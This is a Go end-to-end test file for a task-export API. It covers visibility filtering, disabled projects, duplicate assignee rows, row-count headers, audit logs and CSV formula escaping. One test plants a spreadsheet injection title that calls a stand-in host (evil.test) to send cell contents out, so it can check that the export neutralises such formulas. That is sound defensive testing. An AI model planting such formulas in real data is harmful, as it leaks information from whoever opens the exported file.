package e2e

import (
	"context"
	"encoding/csv"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

// TestExportTasksJSON verifies that a member can export workspace tasks
// as JSON and the output contains the expected tasks.
func TestExportTasksJSON(t *testing.T) {
	bootstrap(t)
	t.Parallel()
	tt := newTenant(t)

	wsURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID

	// Create a few tasks to export.
	for _, title := range []string{"Task Alpha", "Task Beta"} {
		doJSON(t, http.MethodPost, testServerURL+"/tasks",
			tt.AccessToken, map[string]any{
				"projectId": tt.ProjectPublicID,
				"title":     title,
			}, nil)
	}

	// Export as JSON.
	var exported struct {
		Format string `json:"format"`
		Count  int    `json:"count"`
		Tasks  []struct {
			ID    string `json:"id"`
			Title string `json:"title"`
		} `json:"tasks"`
	}
	doJSON(t, http.MethodGet, wsURL+"/export/tasks?format=json",
		tt.AccessToken, nil, &exported)
	require.Equal(t, "json", exported.Format)
	require.GreaterOrEqual(t, exported.Count, 2, "at least the two created tasks")
	require.GreaterOrEqual(t, len(exported.Tasks), 2)
}

// TestExportTasksCSV verifies that a member can export workspace tasks
// as CSV and receives valid comma-separated output.
func TestExportTasksCSV(t *testing.T) {
	bootstrap(t)
	t.Parallel()
	tt := newTenant(t)

	wsURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID

	// Create a task so the export is non-empty.
	doJSON(t, http.MethodPost, testServerURL+"/tasks",
		tt.AccessToken, map[string]any{
			"projectId": tt.ProjectPublicID,
			"title":     "CSV Test Task",
		}, nil)

	// Export as CSV (raw response — may not be JSON).
	status, body := doJSONStatus(t, http.MethodGet, wsURL+"/export/tasks.csv",
		tt.AccessToken, nil)
	require.Equal(t, http.StatusOK, status)
	require.True(t, len(body) > 0, "CSV body must not be empty")

	// CSV should contain a header row and the task title.
	csv := string(body)
	require.True(t, strings.Contains(csv, "title") || strings.Contains(csv, "Title"),
		"CSV must contain a header row")
	require.Contains(t, csv, "CSV Test Task")
}

// TestExportTasksExcludesDisabledProjectTasks verifies that tasks whose
// parent project is disabled (enabled=FALSE) are excluded from the
// workspace export, even when the tasks themselves still claim
// enabled=TRUE. Regression for the audit fix that added
// `AND p.enabled = TRUE` to the projects INNER JOIN in
// ExportTasksForWorkspace.
//
// We bypass the project-disable handler (which cascades enabled=FALSE
// onto child tasks) by issuing a direct UPDATE so the test can simulate
// the inconsistent state the JOIN guard now defends against.
func TestExportTasksExcludesDisabledProjectTasks(t *testing.T) {
	bootstrap(t)
	t.Parallel()
	tt := newTenant(t)

	wsURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID

	// Create a second project alongside the tenant default project.
	var disabledProj struct {
		ID string `json:"id"`
	}
	doJSON(t, http.MethodPost, wsURL+"/projects", tt.AccessToken,
		map[string]any{
			"slug": "exp-disabled-" + randomHex(4),
			"name": "Project To Disable",
		}, &disabledProj)
	require.NotEmpty(t, disabledProj.ID)

	// Create one task in each project.
	var visibleTask, hiddenTask struct {
		ID string `json:"id"`
	}
	doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
		map[string]any{
			"projectId": tt.ProjectPublicID,
			"title":     "Visible task in enabled project",
		}, &visibleTask)
	doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
		map[string]any{
			"projectId": disabledProj.ID,
			"title":     "Hidden task in disabled project",
		}, &hiddenTask)
	require.NotEmpty(t, visibleTask.ID)
	require.NotEmpty(t, hiddenTask.ID)

	// Disable the second project directly via SQL — bypassing the
	// handler's child-task cascade so the task row stays enabled. This
	// reproduces the leak scenario the JOIN guard now blocks.
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, err := testDB.ExecContext(ctx,
		`UPDATE projects SET enabled = FALSE
		 WHERE public_id = UUID_TO_BIN(?, 0)`, disabledProj.ID)
	require.NoError(t, err, "soft-disable of project must succeed")

	// Export and assert only the visible task is returned.
	var exported struct {
		Format string `json:"format"`
		Count  int    `json:"count"`
		Tasks  []struct {
			ID    string `json:"id"`
			Title string `json:"title"`
		} `json:"tasks"`
	}
	doJSON(t, http.MethodGet, wsURL+"/export/tasks?format=json",
		tt.AccessToken, nil, &exported)

	titles := make([]string, 0, len(exported.Tasks))
	for _, x := range exported.Tasks {
		titles = append(titles, x.Title)
	}
	require.Contains(t, titles, "Visible task in enabled project")
	require.NotContains(t, titles, "Hidden task in disabled project",
		"tasks under disabled projects must not appear in workspace export")
}

func TestExportTasksAppliesTaskVisibilityFilter(t *testing.T) {
	bootstrap(t)
	t.Parallel()
	owner := newTenant(t)
	member := seedWorkspaceMemberWithoutProjectRole(t, owner)

	needle := "export visibility " + randomHex(6)
	publicTitle := needle + " public"
	projectTitle := needle + " project"
	privateTitle := needle + " private"

	var publicTask, projectTask, privateTask struct {
		ID string `json:"id"`
	}
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{
			"projectId":  owner.ProjectPublicID,
			"title":      publicTitle,
			"visibility": "public",
		}, &publicTask)
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{
			"projectId":  owner.ProjectPublicID,
			"title":      projectTitle,
			"visibility": "project",
		}, &projectTask)
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{
			"projectId":  owner.ProjectPublicID,
			"title":      privateTitle,
			"visibility": "private",
		}, &privateTask)
	require.NotEmpty(t, publicTask.ID)
	require.NotEmpty(t, projectTask.ID)
	require.NotEmpty(t, privateTask.ID)

	wsURL := testServerURL + "/workspaces/" + owner.WorkspacePublicID
	var exported struct {
		Tasks []struct {
			ID    string `json:"id"`
			Title string `json:"title"`
		} `json:"tasks"`
	}
	doJSON(t, http.MethodGet, wsURL+"/export/tasks?format=json&limit=100",
		member.AccessToken, nil, &exported)

	jsonTitles := make([]string, 0, len(exported.Tasks))
	for _, task := range exported.Tasks {
		jsonTitles = append(jsonTitles, task.Title)
	}
	require.Contains(t, jsonTitles, publicTitle,
		"workspace member should export public tasks")
	require.NotContains(t, jsonTitles, projectTitle,
		"workspace member without project membership must not export project-visibility tasks")
	require.NotContains(t, jsonTitles, privateTitle,
		"workspace member without actor/creator access must not export private tasks")

	status, body := doJSONStatus(t, http.MethodGet, wsURL+"/export/tasks.csv?limit=100",
		member.AccessToken, nil)
	require.Equal(t, http.StatusOK, status)
	csv := string(body)
	require.Contains(t, csv, publicTitle)
	require.NotContains(t, csv, projectTitle)
	require.NotContains(t, csv, privateTitle)
}

func TestMCPExportTasksAppliesTaskVisibilityFilter(t *testing.T) {
	bootstrap(t)
	t.Parallel()
	owner := newTenant(t)
	member := seedWorkspaceMemberWithoutProjectRole(t, owner)
	tok := mintMCPToken(t, member.AccessToken, owner.WorkspacePublicID,
		"export-visibility", []string{"read:workspace"})

	needle := "mcp export visibility " + randomHex(6)
	publicTitle := needle + " public"
	projectTitle := needle + " project"
	privateTitle := needle + " private"

	var publicTask, projectTask, privateTask struct {
		ID string `json:"id"`
	}
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{
			"projectId":  owner.ProjectPublicID,
			"title":      publicTitle,
			"visibility": "public",
		}, &publicTask)
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{
			"projectId":  owner.ProjectPublicID,
			"title":      projectTitle,
			"visibility": "project",
		}, &projectTask)
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{
			"projectId":  owner.ProjectPublicID,
			"title":      privateTitle,
			"visibility": "private",
		}, &privateTask)
	require.NotEmpty(t, publicTask.ID)
	require.NotEmpty(t, projectTask.ID)
	require.NotEmpty(t, privateTask.ID)

	body := mcpCall(t, tok, "tools/call", map[string]any{
		"name": "export_tasks",
		"arguments": map[string]any{
			"limit": 100,
		},
	})
	result := mcpToolTextJSON[struct {
		Tasks []struct {
			ID    string `json:"id"`
			Title string `json:"title"`
		} `json:"tasks"`
	}](t, body)

	titles := make([]string, 0, len(result.Tasks))
	for _, task := range result.Tasks {
		titles = append(titles, task.Title)
	}
	require.Contains(t, titles, publicTitle,
		"workspace member should export public tasks over MCP")
	require.NotContains(t, titles, projectTitle,
		"MCP export must hide project-visibility tasks without project membership")
	require.NotContains(t, titles, privateTitle,
		"MCP export must hide private tasks without actor/creator access")
}

// TestExportTasksCountsAMultiAssigneeTaskOnce is the regression for an
// export that multiplied rows by assignee.
//
// The query joined task_actors on task_id alone, so a task with three
// assignees came back three times. That is not only a wrong file: the
// export is counted and capped by row, so the copies inflate the count
// the caller sees and consume the row budget, and real tasks fall off
// the end of a migration export without anything saying so.
func TestExportTasksCountsAMultiAssigneeTaskOnce(t *testing.T) {
	bootstrap(t)
	t.Parallel()

	owner := newTenant(t)
	wsURL := testServerURL + "/workspaces/" + owner.WorkspacePublicID

	var task struct {
		ID string `json:"id"`
	}
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{"projectId": owner.ProjectPublicID, "title": "Shared work"}, &task)
	require.NotEmpty(t, task.ID)

	// Two more people on the same task, so it has three assignees.
	for range 2 {
		extra := seedGuestMember(t, owner)
		doJSON(t, http.MethodPost, testServerURL+"/tasks/"+task.ID+"/actors",
			owner.AccessToken,
			map[string]any{"userId": extra.UserPublicID, "role": "assignee"}, nil)
	}

	var exported struct {
		Count int `json:"count"`
		Tasks []struct {
			ID                  string  `json:"id"`
			Title               string  `json:"title"`
			AssigneeDisplayName *string `json:"assigneeDisplayName,omitempty"`
		} `json:"tasks"`
	}
	doJSON(t, http.MethodGet, wsURL+"/export/tasks?format=json",
		owner.AccessToken, nil, &exported)

	seen := 0
	for _, row := range exported.Tasks {
		if row.ID == task.ID {
			seen++
		}
	}
	require.Equal(t, 1, seen,
		"a task must appear once however many people it is assigned to")
	require.Equal(t, len(exported.Tasks), exported.Count,
		"the reported count must match the rows actually returned")
}

// TestExportLimitCountsTasksNotAssignees pins the consequence that made
// the duplication a data-loss bug rather than a cosmetic one: the limit
// is a budget of tasks, and copies of one task must not spend it.
//
// Order matters to the test. Rows come back newest first, so the
// multi-assignee task is created last: under the old join its three
// copies filled a limit of three on their own and the two older tasks
// fell off the end. Created first, its copies would have sorted last
// and the loss would not show.
func TestExportLimitCountsTasksNotAssignees(t *testing.T) {
	bootstrap(t)
	t.Parallel()

	owner := newTenant(t)
	wsURL := testServerURL + "/workspaces/" + owner.WorkspacePublicID

	wanted := map[string]string{}
	for _, title := range []string{"Older one", "Older two"} {
		var task struct {
			ID string `json:"id"`
		}
		doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
			map[string]any{"projectId": owner.ProjectPublicID, "title": title}, &task)
		wanted[task.ID] = title
	}

	var shared struct {
		ID string `json:"id"`
	}
	doJSON(t, http.MethodPost, testServerURL+"/tasks", owner.AccessToken,
		map[string]any{"projectId": owner.ProjectPublicID, "title": "Newest, shared"}, &shared)
	for range 2 {
		extra := seedGuestMember(t, owner)
		doJSON(t, http.MethodPost, testServerURL+"/tasks/"+shared.ID+"/actors",
			owner.AccessToken,
			map[string]any{"userId": extra.UserPublicID, "role": "assignee"}, nil)
	}
	wanted[shared.ID] = "Newest, shared"

	var exported struct {
		Count int `json:"count"`
		Tasks []struct {
			ID string `json:"id"`
		} `json:"tasks"`
	}
	doJSON(t, http.MethodGet, wsURL+"/export/tasks?format=json&limit=3",
		owner.AccessToken, nil, &exported)

	got := map[string]bool{}
	for _, row := range exported.Tasks {
		got[row.ID] = true
	}
	for id, title := range wanted {
		require.Truef(t, got[id],
			"%q was dropped: the row budget was spent on duplicates of another task", title)
	}
}

// TestExportJSONRouteRejectsCSVFormat pins that the JSON export no
// longer answers a request for CSV with JSON.
//
// The parameter accepted csv — and defaulted to it — while the handler
// ignored it, so a caller asking for a CSV received a JSON body with
// "format":"csv" written in it and nothing pointing at the route that
// does serve the file. Being told no, with the right path in the
// message, is the part that was missing.
func TestExportJSONRouteRejectsCSVFormat(t *testing.T) {
	bootstrap(t)
	t.Parallel()

	tt := newTenant(t)
	wsURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID

	status, body := doJSONStatus(t, http.MethodGet, wsURL+"/export/tasks?format=csv",
		tt.AccessToken, nil)
	require.Equal(t, http.StatusUnprocessableEntity, status,
		"the JSON route must refuse a format it cannot produce, not answer with the other one")
	require.NotContains(t, string(body), `"tasks"`,
		"a refusal must not carry an export payload")

	// And the default is now the format the route actually serves.
	var exported struct {
		Format string `json:"format"`
	}
	doJSON(t, http.MethodGet, wsURL+"/export/tasks", tt.AccessToken, nil, &exported)
	require.Equal(t, "json", exported.Format,
		"the echoed format must name what was returned")
}

// TestExportCSVReportsItsRowCount covers the signal a caller needs to
// tell a complete export from one that stopped at the ceiling.
//
// The file itself cannot answer that: counting lines in a CSV is wrong
// the moment a description contains a newline, and a partial export is
// exactly the case where someone trusts an incomplete backup. The
// server knows the number, so it sends it.
func TestExportCSVReportsItsRowCount(t *testing.T) {
	bootstrap(t)
	t.Parallel()

	tt := newTenant(t)
	csvURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID + "/export/tasks.csv"

	for _, title := range []string{"One", "Two", "Three"} {
		doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
			map[string]any{"projectId": tt.ProjectPublicID, "title": title}, nil)
	}

	// A description with an embedded newline: the row count must not be
	// derivable from line counting, which is why it is a header.
	doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
		map[string]any{
			"projectId":   tt.ProjectPublicID,
			"title":       "Multiline",
			"description": "first line\nsecond line",
		}, nil)

	resp, err := csvGet(t, csvURL, tt.AccessToken)
	require.NoError(t, err)
	defer func() { _ = resp.Body.Close() }()
	body, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, resp.StatusCode)

	require.Equal(t, "4", resp.Header.Get("X-Export-Row-Count"),
		"the header must count task rows")
	require.Greater(t, strings.Count(string(body), "\n"), 4,
		"the file has more lines than rows, which is why the count is a header and not a line tally")

	// Asking for fewer rows than exist is how a caller learns the export
	// is partial: the count comes back equal to the ceiling.
	resp2, err := csvGet(t, csvURL+"?limit=2", tt.AccessToken)
	require.NoError(t, err)
	defer func() { _ = resp2.Body.Close() }()
	_, _ = io.Copy(io.Discard, resp2.Body)
	require.Equal(t, "2", resp2.Header.Get("X-Export-Row-Count"),
		"an export that stopped at the ceiling must say so through the count")
}

// TestExportCSVAuditRecordsTheDownloadNotTheQuery pins what the audit
// trail says an export was.
//
// The handler sends 200 before the first row, so the record it leaves
// is the only lasting account of how much data left the workspace. It
// used to be written before the body and to carry the size of the
// result set, which meant an export the caller cut off after a dozen
// rows was filed as a complete one. The count now comes from the write,
// and `complete` is what qualifies it.
func TestExportCSVAuditRecordsTheDownloadNotTheQuery(t *testing.T) {
	bootstrap(t)
	t.Parallel()

	tt := newTenant(t)
	for _, title := range []string{"Audited One", "Audited Two"} {
		doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
			map[string]any{"projectId": tt.ProjectPublicID, "title": title}, nil)
	}

	resp, err := csvGet(t, testServerURL+"/workspaces/"+tt.WorkspacePublicID+"/export/tasks.csv", tt.AccessToken)
	require.NoError(t, err)
	defer func() { _ = resp.Body.Close() }()
	_, _ = io.Copy(io.Discard, resp.Body)
	require.Equal(t, http.StatusOK, resp.StatusCode)

	var count, selected int
	var complete bool
	require.NoError(t, testDB.QueryRow(
		`SELECT metadata_json->>'$.count', metadata_json->>'$.selected', metadata_json->>'$.complete'
		 FROM audit_logs
		 WHERE workspace_id = (SELECT id FROM workspaces WHERE public_id = UUID_TO_BIN(?, 0))
		   AND action = 'export.create'
		 ORDER BY id DESC LIMIT 1`,
		tt.WorkspacePublicID).Scan(&count, &selected, &complete),
		"a CSV export must leave an export.create entry carrying what was delivered")

	require.Equal(t, 2, count, "the audited count must be the rows written to the response")
	require.Equal(t, 2, selected, "a clean export delivers everything the query selected")
	require.True(t, complete, "an export that finished must be recorded as complete")
}

// csvGet issues an authenticated GET and returns the raw response so a
// test can read headers the JSON helpers discard.
func csvGet(t *testing.T, url, bearer string) (*http.Response, error) {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, url, nil)
	require.NoError(t, err)
	req.Header.Set("Authorization", "Bearer "+bearer)
	return http.DefaultClient.Do(req)
}

// TestExportCSVNeutralisesFormulas is the regression for a CSV that
// executes when opened.
//
// Anyone who can name a task can leave a formula in the workspace, and
// it stays inert until someone exports and opens the file — usually an
// administrator, looking at everything. The exported cell must not
// start with a character the spreadsheet reads as "evaluate this".
func TestExportCSVNeutralisesFormulas(t *testing.T) {
	bootstrap(t)
	t.Parallel()

	tt := newTenant(t)
	csvURL := testServerURL + "/workspaces/" + tt.WorkspacePublicID + "/export/tasks.csv"

	titles := []string{
		`=HYPERLINK("http://evil.test/?"&A1,"click")`,
		`+1+1`,
		`-1+1`,
		`@SUM(A1:A9)`,
	}
	for _, title := range titles {
		doJSON(t, http.MethodPost, testServerURL+"/tasks", tt.AccessToken,
			map[string]any{"projectId": tt.ProjectPublicID, "title": title}, nil)
	}

	resp, err := csvGet(t, csvURL, tt.AccessToken)
	require.NoError(t, err)
	defer func() { _ = resp.Body.Close() }()
	raw, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, resp.StatusCode)

	// Parse the file the way a spreadsheet does: quoting is removed
	// before anything decides whether a cell is a formula, so the test
	// has to look at the parsed values rather than the raw bytes.
	body := strings.TrimPrefix(string(raw), "\xef\xbb\xbf")
	records, err := csv.NewReader(strings.NewReader(body)).ReadAll()
	require.NoError(t, err)

	seen := 0
	for _, record := range records {
		for _, cell := range record {
			if cell == "" {
				continue
			}
			require.NotContainsf(t, "=+-@\t\r", string(cell[0]),
				"a cell may not begin with a character a spreadsheet evaluates, got %q", cell)
		}
		if len(record) > 1 && strings.HasPrefix(record[1], "'") {
			seen++
		}
	}
	require.Equal(t, len(titles), seen,
		"every planted formula must appear, escaped, or the test proved nothing")
}
